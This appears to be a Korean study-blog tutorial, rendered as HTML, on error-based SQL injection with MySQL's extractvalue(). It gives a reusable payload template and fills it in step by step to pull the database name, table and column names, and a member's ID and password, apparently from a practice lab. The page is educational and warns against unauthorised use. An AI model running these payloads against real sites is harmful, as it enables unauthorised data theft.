@@ -1,0 +1,833 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="ko" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>SQL injection 데이터 추출(3) | 나의 코딩 공부</title>
+<meta name="description" content="">
+
+
+  <meta name="author" content="ethan">
+  
+  <meta property="article:author" content="ethan">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="ko_KR">
+<meta property="og:site_name" content="나의 코딩 공부">
+<meta property="og:title" content="SQL injection 데이터 추출(3)">
+<meta property="og:url" content="http://localhost:4000/sql-injection/SQLinjection15/">
+
+
+  <meta property="og:description" content="">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2024-06-01T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/sql-injection/SQLinjection15/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "코딩",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+  <meta name="naver-site-verification" content="cda5169ee8858dc0fd65c97ed6247167558b5352">
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="나의 코딩 공부 Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/ethan.png" alt="나의 코딩 공부"></a>
+        
+        <a class="site-title" href="/">
+          나의 코딩 공부
+          <span class="site-subtitle">daily study</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/">Category</a>
+            </li><li class="masthead__menu-item">
+              <a href="/search/">Search</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">토글 메뉴</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#sql-injection" itemprop="item"><span itemprop="name">Sql injection</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">SQL injection 데이터 추출(3)</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="SQL injection 데이터 추출(3)">
+    <meta itemprop="description" content="">
+    <meta itemprop="datePublished" content="2024-06-01T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4000/sql-injection/SQLinjection15/" class="u-url" itemprop="url">SQL injection 데이터 추출(3)
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-06-01T00:00:00+09:00">2024-06-01</time>
+      </span>
+    
+
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-fas fa-laptop-code"></i> 목차</h4></header>
+              <ul class="toc__menu"><li><a href="#1-sql-injection-데이터-추출3">1. SQL injection 데이터 추출(3)</a><ul><li><a href="#11-개요">1.1 개요 </a></li><li><a href="#12-error-based-sql-injection에러-메세지를-출력하여-화면에서-볼-수-있을때">1.2  Error Based SQL Injection(에러 메세지를 출력하여 화면에서 볼 수 있을때)</a><ul><li><a href="#121-필요한-개념">1.2.1 필요한 개념</a></li><li><a href="#122-데이터-추출의-과정에러-메세지를-화면으로-볼-수-있을-때">1.2.2 데이터 추출의 과정(에러 메세지를 화면으로 볼 수 있을 때)</a><ul><li><a href="#1221-sql-injection-포인트-찾기">1.2.2.1 sql injection 포인트 찾기</a></li><li><a href="#1222--에러-출력-함수">1.2.2.2  에러 출력 함수</a></li><li><a href="#1223-공격-format-만들기">1.2.2.3 공격 format 만들기</a></li><li><a href="#1224-db이름-확인하기">1.2.2.4 DB이름 확인하기</a></li><li><a href="#1225-table이름-확인하기">1.2.2.5 table이름 확인하기</a></li><li><a href="#1226-column-이름-확인하기">1.2.2.6 column 이름 확인하기</a></li><li><a href="#1227-data-추출하기">1.2.2.7 data 추출하기</a></li></ul></li></ul></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p><br /></p>
+
+<h1 id="1-sql-injection-데이터-추출3"><span style="background:#000000; color:#ffffff">1. SQL injection 데이터 추출(3)</span></h1>
+
+<p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
+<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
+<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>
+
+<p><br /></p>
+
+<h2 id="11-개요"><span style="background:#696969; color:#ffffff">1.1 개요 </span></h2>
+
+<p><br /></p>
+
+<p>저번 SQL injection 데이터 추출(2) 포스팅에서 DB데이터가 화면에 출력 될 때 SQL Injection을 해보았습니다.<br />
+사실 데이터 추출 방식에는 3 가지 방식이 있습니다.</p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:15px">1. SQL 질의 문 결과가 화면에 출력 되는 경우(데이터추출(2)) =&gt; UNION SQLi (로그인 or 게시판 등)</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">2. 에러 메세지가 화면에 출력 되는 경우 =&gt; Error Based SQLi (에러 메세지 확인 가능 한 곳)</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">3. 참과 거짓으로 출력 되는 경우 =&gt; Blind SQLi (로그인 or 아이디 중복 체크 등)</span></p>
+
+<p>와 같은 방식으로 해결할 수 있습니다.</p>
+
+<p><br /></p>
+
+<p>이번 포스팅에서는 2 번을 배워보도록 합시다.</p>
+
+<p><br /></p>
+
+<h2 id="12-error-based-sql-injection에러-메세지를-출력하여-화면에서-볼-수-있을때"><span style="background:#696969; color:#ffffff">1.2  Error Based SQL Injection<span style="font-size:50%">(에러 메세지를 출력하여 화면에서 볼 수 있을때)</span></span></h2>
+
+<p><br /></p>
+
+<h3 id="121-필요한-개념"><span style="background:#909090; color:#ffffff">1.2.1 필요한 개념</span></h3>
+
+<hr />
+
+<p>Error Based SQl Injection은 무엇일까요?<br />
+에러 메세지를 활용해서 데이터를 출력하는 방식입니다.</p>
+
+<p>활용하기 위해서는 조건이 필요합니다.</p>
+
+<p><br /></p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601034401789.png" alt="image-20240601034401789" style="zoom: 67%;" /></p>
+
+<p><br /></p>
+
+<p>먼저 SQL에러가 무엇일까요?<br />
+SQL에러는 SQL쿼리에서 발생하는 에러를 뜻합니다.</p>
+
+<p>그렇다면 문법 에러와 로직 에러가 어떤 점이 다른 지 살펴보겠습니다.</p>
+
+<p><br /></p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:22px"> 〈문법 에러〉 </span></p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601023835764.png" alt="image-20240601023835764" style="zoom: 60%;" /></p>
+
+<p>문법 에러란 ?  sql 쿼리 문이 제대로 된 문법으로 작성되어서 sql에서 요구하는 언어적 문제가 있는지 없는지 보는 것입니다. <br />
+만약 문법 에러가 난다면, 위와 같은 이미지처럼 SQL syntax라고 뜨며, SQL 요청이 거부되어 실행조차 될 수 없습니다. <br />
+Error based SQLi (sql injection)는 sql이 작동하면서, 에러 메세지를 통해 데이터를 추출해내는 기법이므로 문법 에러가<br />
+뜨지 않도록 주의해야 합니다.</p>
+
+<p><br /></p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:22px"> 〈로직 에러〉 </span></p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601025713759.png" alt="image-20240601025713759" style="zoom:80%;" /></p>
+
+<p>위의 이미지처럼 작성한다면, 문법적으로 위배되지 않습니다. 하지만 text라는 column , hi 라는 값은 존재하지 않습니다.<br />
+이처럼 제대로 된 지정된 값을 사용하지 않으면, 로직 에러가 나타나게 됩니다. <br />
+<br /></p>
+
+<p>그치만 위와 같이 쓴다면, 오류 메세지를 확인하는 것은 가능하나 데이터를 추출할 수 없습니다.</p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:20px">😊extractvalue()함수를  <span style="text-decoration: red wavy underline">사용하는 이유:</span>😊</span></p>
+
+<p><code class="language-plaintext highlighter-rouge">extractvalue ()</code> 함수는 XML 문자열에서 지정된 XPath 표현식에 해당하는 데이터를 추출하는 데 사용됩니다.</p>
+
+<p>따라서 에러 메세지가 발생하면, XPath 표현식에 해당하는 데이터를 추출하면서 오류 메세지가 나타나기 때문에<br />
+Error based SQLi에 사용하기 적합합니다.</p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:20px">😊extractvalue()함수를 <span style="text-decoration: red wavy underline">사용하는 법:</span>😊</span> <br />
+<br /></p>
+
+<p>■<span style="font-weight:bold; font-size:20px">[</span><span style="font-size:19px">기본적인 함수 사용법</span><span style="font-weight:bold; font-size:18px">]</span> (<span style="color:red">참고</span>)</p>
+
+<details>
+<summary style="font-size:15px">접기/펼치기</summary>
+<div>
+    <p><br />extractvalue(‘xml 데이터’, ‘xml 표현식’)<br />
+<code class="language-plaintext highlighter-rouge">idx</code> 칼럼에 다음과 같은 XML 데이터가 저장되어 있다고 합시다:</p>
+
+    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+<span class="nt">&lt;name&gt;</span>LEE<span class="nt">&lt;/name&gt;</span>
+<span class="nt">&lt;email&gt;</span>LEE@example.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div>    </div>
+
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="s1">'/user/name'</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">tableName</span><span class="p">;</span>
+</code></pre></div>    </div>
+
+    <p>이 쿼리는 <code class="language-plaintext highlighter-rouge">tableName</code>에서 <code class="language-plaintext highlighter-rouge">idx</code> 칼럼에 저장된 XML 데이터 중 <code class="language-plaintext highlighter-rouge">&lt;user&gt;</code> 태그의 하위 <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> 태그에 해당하는 값을 추출하여 <code class="language-plaintext highlighter-rouge">name</code>이라는 이름으로 반환합니다.   <br />
+<code class="language-plaintext highlighter-rouge">idx</code> 는 또한 ‘ 〈user〉 〈name〉 LEE 〈/name〉 〈email〉 LEE@example.com 〈/email〉 〈/user〉 ‘로 표현 가능.</p>
+
+    <div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gi">+-----------+
+</span>|    name   |
+<span class="gi">+-----------+
+</span>|    LEE    |
+<span class="gi">+-----------+
+</span></code></pre></div>    </div>
+
+    <p>열 제목은 ‘name’으로, 추출된 값은 “LEE”입니다.<br />
+이러한 방식으로 LEE라는 데이터를 추출해 냅니다.</p>
+
+  </div>
+</details>
+<p><br /></p>
+
+<p>■<span style="font-weight:bold; font-size:19px">[</span><span style="font-size:19px">SQLi에서 함수 사용법</span><span style="font-weight:bold; font-size:18px">]</span><br />
+<br /></p>
+
+<p><span style="font-size:17px ;line-height:20px; word-spacing:5px;letter-spacing : 3px">※알아야 할 개념※</span></p>
+
+<p><br /></p>
+
+<p>👉<span style="font-size:17px"> <code class="language-plaintext highlighter-rouge">XPATH syntax error</code>가  발생하는 특수 문자</span></p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601081057098.png" alt="image-20240601081057098" style="zoom:67%;" /></p>
+
+<p>위 이미지처럼 xml 데이터는 상관없고, xml 표현 식에 : , ! , # , % 등등 특수 문자를 앞에 넣게 되면 <br />
+xpath syntax error가 뜨면서 해당 자리의 값이 추출하는 특징을 갖고 있습니다.<br />
+이 데이터를 추출되는 것을 이용하여, select문을 삽입하여 db데이터를 추출하는 방법을 이용할 것입니다.</p>
+
+<p><br /></p>
+
+<p><span style="font-size:17px"> 👉<code class="language-plaintext highlighter-rouge">concat()</code>함수 </span></p>
+
+<p>concat(‘a’,’b’) —–&gt; ab<br />
+concat(‘0x3a’, ‘test’) ——&gt; :test</p>
+
+<p>ex)   : 의 16진수는 0x3a , !의 16진수는 0x21, #의 16진수는 0x23……..</p>
+
+<p><br /></p>
+
+<p><br /></p>
+
+<h3 id="122-데이터-추출의-과정에러-메세지를-화면으로-볼-수-있을-때"><span style="background:#909090; color:#ffffff">1.2.2 데이터 추출의 과정<span style="font-size:50%">(에러 메세지를 화면으로 볼 수 있을 때)</span></span></h3>
+
+<hr />
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:20px">〈 Error Based 이용한 sql injection pocess 〉</span></p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:15px">1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">2. 에러 출력 함수</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">3. 공격 format 만들기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">4. DB이름 확인하기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">5. table이름 확인하기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">6. column 이름 확인하기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">7. data 추출하기</span></p>
+
+<p>예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.</p>
+
+<p><br /></p>
+
+<h4 id="1221-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.1 sql injection 포인트 찾기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>기본적으로 Error Based SQLi를 적용하려면 SQL 에러를 화면에 출력 되어야 하므로,</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601094626149.png" alt="image-20240601094626149" style="zoom:50%;" /></p>
+
+<p>SQL에러 와 관련된 에러가 발생하는지 확인한다.</p>
+
+<p><br /></p>
+
+<h4 id="1222--에러-출력-함수"><span style="background:#A9A9A9; color:#ffffff">1.2.2.2  에러 출력 함수</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>(대표적)<strong><code class="language-plaintext highlighter-rouge">EXTRACTVALUE()</code></strong>
+or <strong><code class="language-plaintext highlighter-rouge">CAST()</code></strong>와<strong><code class="language-plaintext highlighter-rouge">CONVERT()</code></strong> 등을 이용.</p>
+
+<p><br /></p>
+
+<h4 id="1223-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.3 공격 format 만들기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(select ‘test’))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601100910338.png" alt="image-20240601100910338" style="zoom:67%;" /></p>
+
+<p>문법 에러가 나타나지 않으면서, 로직 에러가 나타나는 것 까지 확인 했습니다!</p>
+
+<p><br /></p>
+
+<p>따라서</p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1</p>
+
+<p>이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.</p>
+
+<p><br /></p>
+
+<h4 id="1224-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.4 DB이름 확인하기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>DB 이름 확인하는 법은 <br />
+select database() 이므로, <br />
+<br /></p>
+
+<p>공격 format <br />
+‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
+에 대입한다. <br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select database() limit 0,1</span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601101741238.png" alt="image-20240601101741238" style="zoom:67%;" /></p>
+
+<p><br /></p>
+
+<h4 id="1225-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.5 table이름 확인하기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>table 이름 확인하는 법은<br />
+select table_name from information_schema.tables where table_schema=’DB name’ limit 0,1 이므로, <br />
+<br /></p>
+
+<p>공격 format<br />
+‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
+에 대입한다. <br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema=’segfault_sql’ limit 0,1 </span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102131068.png" alt="image-20240601102131068" style="zoom:67%;" />[limit 0,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102219083.png" alt="image-20240601102219083" style="zoom:67%;" />[limit 1,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102338714.png" alt="image-20240601102338714" style="zoom:67%;" />[limit 2,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102414956.png" alt="image-20240601102414956" style="zoom:67%;" />[limit 3,1]</p>
+
+<p><br /></p>
+
+<h4 id="1226-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.6 column 이름 확인하기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>column 이름 확인하는 법은<br />
+select column_name from information_schema.columns where table_name=’table name’ limit 0,1 이므로, <br />
+<br /></p>
+
+<p>공격 format<br />
+‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
+에 대입한다.<br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name=’member’ limit 0,1</span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102826831.png" alt="image-20240601102826831" style="zoom:67%;" />[limit 0,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102900086.png" alt="image-20240601102900086" style="zoom:67%;" />[limit 1,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102928085.png" alt="image-20240601102928085" style="zoom:67%;" />[limit 2,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103001659.png" alt="image-20240601103001659" style="zoom:67%;" />[limit 3,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103026201.png" alt="image-20240601103026201" style="zoom:67%;" />[limit 4,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103053717.png" alt="image-20240601103053717" style="zoom:67%;" />[limit 5,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103136119.png" alt="image-20240601103136119" style="zoom:67%;" />[limit 6,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103203656.png" alt="image-20240601103203656" style="zoom:67%;" />[limit 7,1]</p>
+
+<p>이런 식으로 컬럼을 알 수 있다.</p>
+
+<p><br /></p>
+
+<h4 id="1227-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.7 data 추출하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>같은 방식으로 <br />
+select flag from flagTable limit 0,1<br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select id from member limit 0,1</span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103508970.png" alt="image-20240601103508970" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103530142.png" alt="image-20240601103530142" style="zoom:67%;" /></p>
+
+<p>doldol의 아이디와 비밀번호를 알 수 있습니다.</p>
+
+<p><br /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> 카테고리: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#sql-injection" class="page__taxonomy-item p-category" rel="tag">SQL-injection</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> 업데이트:</strong> <time class="dt-published" datetime="2024-06-01T00:00:00+09:00">2024-06-01</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">공유하기</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=SQL+injection+%EB%8D%B0%EC%9D%B4%ED%84%B0+%EC%B6%94%EC%B6%9C%283%29%20http%3A%2F%2Flocalhost%3A4000%2Fsql-injection%2FSQLinjection15%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fsql-injection%2FSQLinjection15%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fsql-injection%2FSQLinjection15%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/sql-injection/SQLinjection9/" class="pagination--pager" title="5주차 SQL injection 인증우회 문제풀이(5)
+">이전</a>
+    
+    
+      <a href="/sql-injection/SQLinjection16/" class="pagination--pager" title="SQL injection 데이터 추출(4)
+">다음</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">참고</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/file/upload/File-Upload/" rel="permalink">File Upload 취약점
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-19T00:00:00+09:00">2024-07-19</time>
+      </span>
+    
+
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/csrf/CSRF2/" rel="permalink">CSRF 방지
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-04T00:00:00+09:00">2024-07-04</time>
+      </span>
+    
+
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/csrf/CSRF1/" rel="permalink">CSRF 개념
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-04T00:00:00+09:00">2024-07-04</time>
+      </span>
+    
+
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/xss/XSS10/" rel="permalink">XSS에 이용되는 Javascript 활용하기
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-07-02T00:00:00+09:00">2024-07-02</time>
+      </span>
+    
+
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>팔로우:</strong></li>
+    
+
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> 피드</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 코딩. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/sql-injection/SQLinjection15/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/sql-injection/SQLinjection15"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://ethan.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
